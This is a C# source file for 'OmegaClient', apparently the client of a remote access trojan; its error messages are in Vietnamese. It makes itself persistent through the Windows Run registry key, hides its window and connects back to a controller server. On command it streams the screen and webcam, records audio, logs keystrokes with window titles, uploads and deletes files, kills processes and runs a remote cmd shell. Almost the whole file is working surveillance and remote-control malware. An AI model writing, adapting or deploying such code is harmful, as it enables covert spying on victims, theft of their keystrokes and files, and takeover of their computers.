using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;
using System.Reflection;
using System.Media;

[assembly: AssemblyTitle("OmegaClient")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("OmegaClient")]
[assembly: AssemblyCopyright("Copyright ©  2020")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]
[assembly: ComVisible(false)]
[assembly: Guid("054625d1-24e6-4b04-bb6e-40c606a7ff58")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]

namespace OmegaClient
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [STAThreadAttribute]
        static void Main()
        {
            string startupType = "[STARTUPTYPE]";
            string tempPath = Path.GetTempPath();
            string exePath = Assembly.GetExecutingAssembly().Location;
            string exeName = Path.GetFileName(exePath);
            if (startupType == "[STARTUP]" && !File.Exists(tempPath + exeName))
            {
                Process process = new Process();
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = "/C REG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"" + exeName + "\" /t REG_SZ /F /D \"" + tempPath + exeName + "\"";
                process.StartInfo = startInfo;
                process.Start();
                File.Copy(exePath, tempPath + exeName);
                Process.Start(tempPath + exeName);
                return;
            }
            else
            {
                IntPtr h = Process.GetCurrentProcess().MainWindowHandle;
                ShowWindow(h, 0);
                Client client = new Client();
                client.ClientConnect();
            }
        }
    }

    class Client
    {
        [DllImport("user32", EntryPoint = "SendMessage")]
        static extern int SendMessage(int hWnd, uint Msg, int wParam, int lParam);

        [DllImport("gdi32.dll")]
        static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
        public enum DeviceCap
        {
            VERTRES = 10,
            DESKTOPVERTRES = 117,
        }

        [DllImport("avicap32.dll", EntryPoint = "capCreateCaptureWindowA")]
        static extern int capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int X, int Y, int nWidth, int nHeight, int hwndParent, int nID);
        const int WM_CAP_CONNECT = 1034;
        const int WM_CAP_DISCONNECT = 1035;
        const int WM_CAP_COPY = 1054;
        const int WM_CAP_GET_FRAME = 1084;

        [DllImport("user32.dll")]
        static extern void mouse_event(uint dwFlags, int dx, int dy, int dwData, int dwExtraInfo);

        const uint MOUSEEVENTF_ABSOLUTE = 0x8000;
        const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        const uint MOUSEEVENTF_LEFTUP = 0x0004;
        const uint MOUSEEVENTF_MIDDLEDOWN = 0x0020;
        const uint MOUSEEVENTF_MIDDLEUP = 0x0040;
        const uint MOUSEEVENTF_MOVE = 0x0001;
        const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
        const uint MOUSEEVENTF_RIGHTUP = 0x0010;
        const uint MOUSEEVENTF_XDOWN = 0x0080;
        const uint MOUSEEVENTF_XUP = 0x0100;
        const uint MOUSEEVENTF_WHEEL = 0x0800;
        const uint MOUSEEVENTF_HWHEEL = 0x01000;

        [DllImport("user32.dll")]
        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, int dwExtraInfo);

        const uint KEYEVENTF_EXTENDEDKEY = 0x0001;
        const uint KEYEVENTF_KEYUP = 0x0002;

        [StructLayout(LayoutKind.Sequential)]
        private struct SHFILEINFO
        {
            public IntPtr hIcon;
            public int iIcon;
            public uint dwAttributes;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szDisplayName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
            public string szTypeName;
        };

        [DllImport("shell32.dll")]
        private static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, uint cbSizeFileInfo, uint uFlags);

        private const uint SHGFI_ICON = 0x100;
        private const uint SHGFI_LARGEICON = 0x0;
        private const uint SHGFI_SMALLICON = 0x000000001;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("winmm.dll")]
        static extern Int32 mciSendString(string command, StringBuilder buffer, int bufferSize, Int32 hwndCallback);

        [DllImport("winmm.dll")]
        static extern Int32 mciGetErrorString(Int32 errorCode, StringBuilder errorText, Int32 errorTextSize);

        private TcpClient client;
        private static NetworkStream mainStream;
        private bool running = false;
        private int RDQuality = 100;
        private int CameraQuality = 100;
        private string serverIpaddress = "127.0.0.1";
        private string serverPort = "8181";
        private StreamWriter cmdInput;
        private Thread RunAppThread;
        private Thread recordAudioThread;
        private static string currentWindow = "";
        private static string tempWindow = "";

        public void ClientConnect()
        {
            try
            {
                IPAddress IP = Dns.GetHostEntry(serverIpaddress).AddressList.First(addr => addr.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork);
                client = new TcpClient();
                client.Connect(IP, int.Parse(serverPort));
                client.NoDelay = true;
                mainStream = client.GetStream();
                if (mainStream.CanWrite)
                {
                    byte[] p0 = Encoding.UTF8.GetBytes("[PACKET000]|" + Environment.MachineName);
                    mainStream.Write(p0, 0, p0.Length);
                }
                Thread mainThread = new Thread(ServerHandle);
                mainThread.SetApartmentState(ApartmentState.STA);
                mainThread.Start();

            } catch (Exception) { this.ClientConnect(); }
        }

        public void ServerHandle()
        {
            try
            {
                byte[] Bytes = new Byte[40960];
                String data = String.Empty;
                int i;
                while ((i = mainStream.Read(Bytes, 0, Bytes.Length)) != 0)
                {
                    data = Encoding.UTF8.GetString(Bytes, 0, i);
                    if (data.Length < 11) continue;
                    string[] packetDecode = data.Split(new char[] { '|' });
                    switch (packetDecode[0])
                    {
                        case "[PACKETEXIT]":
                            Application.Exit();
                            return;
                        case "[PACKET000]":
                            running = false;
                            Application.Exit();
                            break;
                        case "[PACKET001]":
                            byte[] p1 = Encoding.UTF8.GetBytes("[PACKET001]");
                            mainStream.Write(p1, 0, p1.Length);
                            running = true;
                            Thread remoteControlThread = new Thread(RemoteControl);
                            remoteControlThread.Start();
                            RemoteDesktop();
                            break;
                        case "[PACKET003]":
                            if (packetDecode.Length > 1)
                            {
                                CameraQuality = int.Parse(packetDecode[1]);
                                break;
                            }
                            byte[] p3 = Encoding.UTF8.GetBytes("[PACKET003]");
                            mainStream.Write(p3, 0, p3.Length);
                            running = true;
                            Thread cameraCaptureThread = new Thread(CameraCapture);
                            cameraCaptureThread.SetApartmentState(ApartmentState.STA);
                            cameraCaptureThread.Start();
                            break;
                        case "[PACKET004]":
                            string sendDrive = "[PACKET004]|";
                            DriveInfo[] allDrives = DriveInfo.GetDrives();
                            foreach (DriveInfo d in allDrives)
                            {
                                sendDrive += d.Name + "|";
                            }
                            byte[] p4 = Encoding.UTF8.GetBytes(sendDrive);
                            mainStream.Write(p4, 0, p4.Length);
                            break;
                        case "[PACKET005]":
                            SendFiles(packetDecode[1]);
                            break;
                        case "[PACKET006]":
                            if (!File.GetAttributes(packetDecode[1]).HasFlag(FileAttributes.Directory))
                            {
                                byte[] fileByte = File.ReadAllBytes(packetDecode[1]);
                                byte[] p6 = Encoding.UTF8.GetBytes("[PACKET006]|" + Path.GetFileName(packetDecode[1]) + "|" + fileByte.Length.ToString());
                                byte[] endByte = Encoding.UTF8.GetBytes("[END]");
                                mainStream.Write(p6, 0, p6.Length);
                                for (int j = 0; j < fileByte.Length; j += 40960)
                                {
                                    if (j + 40960 > fileByte.Length)
                                    {
                                        mainStream.Write(fileByte, j, fileByte.Length - j);
                                    }
                                    else
                                    {
                                        mainStream.Write(fileByte, j, 40960);
                                    }

                                }
                                mainStream.Write(endByte, 0, endByte.Length);
                            }
                            else
                            {
                                SendError("Không thể tải thư mục!");
                            }
                            break;
                        case "[PACKET007]":
                            try
                            {
                                if (File.GetAttributes(packetDecode[1]).HasFlag(FileAttributes.Directory))
                                {
                                    DirectoryCopy(packetDecode[1], packetDecode[2], true);
                                }
                                else
                                {
                                    File.Copy(packetDecode[1], packetDecode[2]);
                                }
                                SendFiles(Path.GetDirectoryName(packetDecode[2]));
                            }
                            catch (Exception)
                            {
                                SendError("Không thể dán tập tin hoặc thư mục!");
                            }

                            break;
                        case "[PACKET008]":
                            try
                            {
                                if (File.GetAttributes(packetDecode[1]).HasFlag(FileAttributes.Directory))
                                {
                                    Directory.Delete(packetDecode[1], true);
                                }
                                else
                                {
                                    File.Delete(packetDecode[1]);
                                }
                                SendFiles(Path.GetDirectoryName(packetDecode[1]));
                            }
                            catch (Exception)
                            {
                                SendError("Không thể xóa tập tin hoặc thư mục");
                            }
                            break;
                        case "[PACKET009]":
                            try
                            {
                                Process.Start(packetDecode[1]);
                            }
                            catch (Exception)
                            {
                                SendError("Không thể mở tập tin!");
                            }
                            break;
                        case "[PACKET010]":
                            SendProcess();
                            break;
                        case "[PACKET011]":
                            Process processKill = Process.GetProcessById(int.Parse(packetDecode[1]));
                            processKill.Kill();
                            SendProcess();
                            break;
                        case "[PACKET012]":
                            if (packetDecode.Length > 1)
                            {
                                cmdInput.WriteLine(packetDecode[1]);
                            }
                            else
                            {
                                Process p = new Process();

                                p.StartInfo.FileName = "cmd.exe";
                                p.StartInfo.UseShellExecute = false;
                                p.StartInfo.CreateNoWindow = true;
                                p.StartInfo.RedirectStandardInput = true;
                                p.StartInfo.RedirectStandardOutput = true;
                                p.StartInfo.RedirectStandardError = true;
                                p.EnableRaisingEvents = true;

                                p.OutputDataReceived += new DataReceivedEventHandler(SendOutCmd);
                                p.ErrorDataReceived += new DataReceivedEventHandler(SendOutCmd);

                                p.Start();

                                cmdInput = p.StandardInput;

                                p.BeginOutputReadLine();
                                p.BeginErrorReadLine();

                                string sendPacket = "[PACKET012]";
                                byte[] sendByte = Encoding.UTF8.GetBytes(sendPacket);
                                mainStream.Write(sendByte, 0, sendByte.Length);
                            }
                            break;
                        case "[PACKET013]":
                            RunAppThread = new Thread(KeyloggerRun);
                            string sendPacket2 = "[PACKET013]";
                            byte[] sendByte2 = Encoding.UTF8.GetBytes(sendPacket2);
                            mainStream.Write(sendByte2, 0, sendByte2.Length);
                            RunAppThread.Start();
                            break;
                        case "[PACKET014]":
                            byte[] sendPacket3 = Encoding.UTF8.GetBytes("[PACKET014]");
                            mainStream.Write(sendPacket3, 0, sendPacket3.Length);
                            break;
                        case "[PACKET015]":
                            running = true;
                            recordAudioThread = new Thread(SendAudio);
                            recordAudioThread.Start();
                            break;
                        case "[PACKET016]":
                            if (recordAudioThread.IsAlive)
                            {
                                recordAudioThread.Abort();
                            }
                            running = false;
                            mciSendString("stop rSound", null, 0, 0);
                            string path = Path.GetTempPath() + @"\r.wav";
                            mciSendString("save rSound " + path, null, 0, 0);
                            mciSendString("close rSound", null, 0, 0);
                            break;
                    }
                }
                running = false;
                mainStream.Close();
                client.Close();
                this.ClientConnect();
            }
            catch (Exception)
            {
                running = false;
                mainStream.Close();
                client.Close();
                this.ClientConnect();
            }
        }

        private static void DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs)
        {
            DirectoryInfo dir = new DirectoryInfo(sourceDirName);
            if (!dir.Exists)
            {
                throw new DirectoryNotFoundException(
                    "Source directory does not exist or could not be found: "
                    + sourceDirName);
            }

            DirectoryInfo[] dirs = dir.GetDirectories();
            if (!Directory.Exists(destDirName))
            {
                Directory.CreateDirectory(destDirName);
            }

            FileInfo[] files = dir.GetFiles();
            foreach (FileInfo file in files)
            {
                string temppath = Path.Combine(destDirName, file.Name);
                file.CopyTo(temppath, false);
            }
        
            if (copySubDirs)
            {
                foreach (DirectoryInfo subdir in dirs)
                {
                    string temppath = Path.Combine(destDirName, subdir.Name);
                    DirectoryCopy(subdir.FullName, temppath, copySubDirs);
                }
            }
        }

        private float GetScalingFactor()
        {
            Graphics g = Graphics.FromHwnd(IntPtr.Zero);
            IntPtr desktop = g.GetHdc();
            int LogicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.VERTRES);
            int PhysicalScreenHeight = GetDeviceCaps(desktop, (int)DeviceCap.DESKTOPVERTRES);

            float ScreenScalingFactor = (float)PhysicalScreenHeight / (float)LogicalScreenHeight;

            return ScreenScalingFactor;
        }

        private void RemoteDesktop()
        {
            while (running)
            {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                float scaleValue = GetScalingFactor();         
                if (scaleValue == 1.25)
                {
                    bounds.Width = bounds.Width + (bounds.Width * 25 / 100);
                    bounds.Height = bounds.Height + (bounds.Height * 25 / 100);
                } else if (scaleValue == 1.5)
                {
                    bounds.Width = bounds.Width + (bounds.Width * 50 / 100);
                    bounds.Height = bounds.Height + (bounds.Height * 50 / 100);
                }
                Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
                Graphics graphic = Graphics.FromImage(bitmap);
                graphic.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
                ImageCodecInfo format = GetEncoder(ImageFormat.Jpeg);
                EncoderParameters quality = new EncoderParameters(1);
                quality.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, Convert.ToInt32(RDQuality));
                MemoryStream memoryStream = new MemoryStream();
                bitmap.Save(memoryStream, format, quality);
                Image image = Image.FromStream(memoryStream);
                BinaryFormatter binFormat = new BinaryFormatter();
                binFormat.Serialize(mainStream, image);
                Thread.Sleep(10);
            }
        }

        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }

        private void RemoteControl()
        {
            try
            {
                byte[] Bytes = new Byte[40960];
                String data = String.Empty;
                int i;
                while ((i = mainStream.Read(Bytes, 0, Bytes.Length)) != 0)
                {
                    if (running == false) return;
                    if (i < 11) continue;
                    data = Encoding.UTF8.GetString(Bytes, 0, i);
                    string[] packetDecode = data.Split(new char[] { '|' });
                    for (int j = 0; j < packetDecode.Length - 1; j += 4)
                    {
                        if (packetDecode[j] == "[PACKET002]")
                        {
                            switch (packetDecode[j + 1])
                            {
                                case "[QUALITY]":
                                    RDQuality = int.Parse(packetDecode[j + 2]);
                                    break;
                                case "[MOUSEMOVE]":
                                    var moveX = (int.Parse(packetDecode[j + 2]) * 65536 / Screen.PrimaryScreen.Bounds.Width) + 1;
                                    var moveY = (int.Parse(packetDecode[j + 3]) * 65536 / Screen.PrimaryScreen.Bounds.Height) + 1;
                                    mouse_event(MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE, (int)moveX, (int)moveY, 0, 0);
                                    break;
                                case "[MOUSELEFTDOWN]":
                                    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                                    break;
                                case "[MOUSERIGHTDOWN]":
                                    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                                    break;
                                case "[MOUSEMIDDLEDOWN]":
                                    mouse_event(MOUSEEVENTF_MIDDLEDOWN, 0, 0, 0, 0);
                                    break;
                                case "[MOUSELEFTUP]":
                                    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                                    break;
                                case "[MOUSERIGHTUP]":
                                    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                                    break;
                                case "[MOUSEMIDDLEUP]":
                                    mouse_event(MOUSEEVENTF_MIDDLEUP, 0, 0, 0, 0);
                                    break;
                                case "[MOUSEWHEEL]":
                                    mouse_event(MOUSEEVENTF_WHEEL, 0, 0, int.Parse(packetDecode[j + 3]), 0);
                                    break;
                                case "[TYPEDOWN]":
                                    keybd_event((byte)int.Parse(packetDecode[j + 2]), 0x45, KEYEVENTF_EXTENDEDKEY, 0);
                                    break;
                                case "[TYPEUP]":
                                    keybd_event((byte)int.Parse(packetDecode[j + 2]), 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
                                    break;
                            }
                        }
                        else if (packetDecode[j] == "[PACKET000]")
                        {
                            running = false;
                            return;
                        }
                    }
                }
            } catch (Exception) { }
            mainStream.Close();
            client.Close();
        }
        private void CameraCapture()
        {
            int captureWindow = capCreateCaptureWindowA("Webcamera", 0, 0, 0, 0, 0, 0, 0);
            SendMessage(captureWindow, WM_CAP_CONNECT, 0, 0);
            try
            {
                while (running)
                {
                    Clipboard.Clear();
                    SendMessage(captureWindow, WM_CAP_GET_FRAME, 0, 0);
                    SendMessage(captureWindow, WM_CAP_COPY, 0, 0);
                    Bitmap bitmap = (Bitmap)Clipboard.GetDataObject().GetData(DataFormats.Bitmap);
                    if (bitmap == null) continue;
                    ImageCodecInfo format = GetEncoder(ImageFormat.Jpeg);
                    EncoderParameters quality = new EncoderParameters(1);
                    quality.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, Convert.ToInt32(CameraQuality));
                    MemoryStream memoryStream = new MemoryStream();
                    bitmap.Save(memoryStream, format, quality);
                    Image image = Image.FromStream(memoryStream);
                    BinaryFormatter binFormat = new BinaryFormatter();
                    binFormat.Serialize(mainStream, image);
                    Thread.Sleep(10);
                }
            } catch (Exception) { }
            SendMessage(captureWindow, WM_CAP_DISCONNECT, 0, 0);
        }

        public void SendFiles(string path)
        {
            try
            {
                string sendFiles = "[PACKET005]|";
                string[] dirArray = Directory.GetDirectories(path);
                foreach (string dir in dirArray)
                {
                    sendFiles += dir + "|";
                }
                string[] fileArray = Directory.GetFiles(path);
                foreach (string file in fileArray)
                {
                    sendFiles += file + "|";
                }
                byte[] p5 = Encoding.UTF8.GetBytes(sendFiles);
                mainStream.Write(p5, 0, p5.Length);
                BinaryFormatter binFormat = new BinaryFormatter();
                foreach (string dir in dirArray)
                {
                    binFormat.Serialize(mainStream, ExtractFromPath(dir).ToBitmap());
                }
                foreach (string file in fileArray)
                {
                    binFormat.Serialize(mainStream, ExtractFromPath(file).ToBitmap());
                }
            }
            catch (Exception)
            {
                SendError("Không thể truy cập thư mục!");
            }
        }

        private void SendProcess()
        {
            Process[] process = Process.GetProcesses();
            string sendPacket = "[PACKET010]|";
            foreach (Process p in process)
            {
                sendPacket += p.Id.ToString() + "|" + p.MainWindowTitle + "|" + p.ProcessName + "|" + Environment.MachineName + "|" + p.WorkingSet64/1024/1024 + "|";
            }
            byte[] sendByte = Encoding.UTF8.GetBytes(sendPacket);
            mainStream.Write(sendByte, 0, sendByte.Length);
        }

        private void SendOutCmd(object o, DataReceivedEventArgs e)
        {
            if (e.Data != null || e.Data != "")
            {
                string sendPacket = "[PACKET012]|" + e.Data + "|";
                byte[] sendByte = Encoding.UTF8.GetBytes(sendPacket);
                mainStream.Write(sendByte, 0, sendByte.Length);
            } 
        }

        private void SendAudio()
        {
            try
            {
                mciSendString("open new type waveaudio alias rSound", null, 0, 0);
                mciSendString("record rSound", null, 0, 0);
                while (running == true)
                {
                    Thread.Sleep(100);
                }
                mciSendString("stop rSound ", null, 0, 0);
                byte[] sendPacket4 = Encoding.UTF8.GetBytes("[PACKET015]");
                mainStream.Write(sendPacket4, 0, sendPacket4.Length);
                string path = Path.GetTempPath() + @"\r.wav";
                mciSendString("save rSound " + path, null, 0, 0);
                SoundPlayer sp = new SoundPlayer(path);
                BinaryFormatter binFormatter = new BinaryFormatter();
                binFormatter.Serialize(mainStream, sp);
                mciSendString("close rSound", null, 0, 0);
            } catch (Exception) { }
        }

        private static void KeyloggerRun()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                currentWindow = "==== " + GetActiveWindowTitle() + " ====";
                if (currentWindow == tempWindow)
                {
                    byte[] sendPacket = Encoding.UTF8.GetBytes("[PACKET013]|" + ((Keys)vkCode).ToString() + "|");
                    mainStream.Write(sendPacket, 0, sendPacket.Length);
                }
                else
                {
                    tempWindow = currentWindow;
                    byte[] sendPacket = Encoding.UTF8.GetBytes("[PACKET013]|" + Environment.NewLine + currentWindow + Environment.NewLine + Environment.NewLine + ((Keys)vkCode).ToString() + "|");
                    mainStream.Write(sendPacket, 0, sendPacket.Length);
                }
                
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
        

        private Icon ExtractFromPath(string path)
        {
            SHFILEINFO shinfo = new SHFILEINFO();
            SHGetFileInfo(
                path,
                0, ref shinfo, (uint)Marshal.SizeOf(shinfo),
                SHGFI_ICON | SHGFI_LARGEICON);
            return Icon.FromHandle(shinfo.hIcon);
        }

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        private void SendError(string str)
        {
            byte[] sendByte = Encoding.UTF8.GetBytes("[ERROR]|" + str);
            mainStream.Write(sendByte, 0, sendByte.Length);
        }
    }
}
